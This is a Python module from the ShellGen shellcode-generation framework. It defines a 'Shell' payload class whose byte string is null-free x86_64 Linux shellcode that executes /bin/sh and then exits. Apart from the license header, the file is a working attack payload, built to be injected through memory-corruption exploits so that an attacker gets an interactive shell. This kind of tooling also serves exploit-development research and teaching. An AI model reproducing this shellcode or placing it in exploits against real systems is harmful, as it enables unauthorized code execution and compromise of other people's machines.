#!/usr/bin/env python

###############################################################################
## Execute /bin/sh in Linux/x86_64                                           ##
## Shellcode for ShellGen                                                    ##
## Based on original code by pancake from 48bits                             ##
## http://radare.org/y/                                                      ##
###############################################################################

# Copyright (c) 2012-2015 Mario Vilas, pancake
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
# MA 02110-1301, USA.

"Execute /bin/sh."

__all__ = ["Shell"]

from shellgen import Static

class Shell (Static):
    """
    Execute /bin/sh in Linux/x86_64.

    Based on original code by pancake from 48bits:
    `<http://radare.org/y/>`_
    """

    qualities = "payload"
    encoding  = "nullfree"

    bytes = (
        "\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53"
        "\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b"
        "\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05"
    )
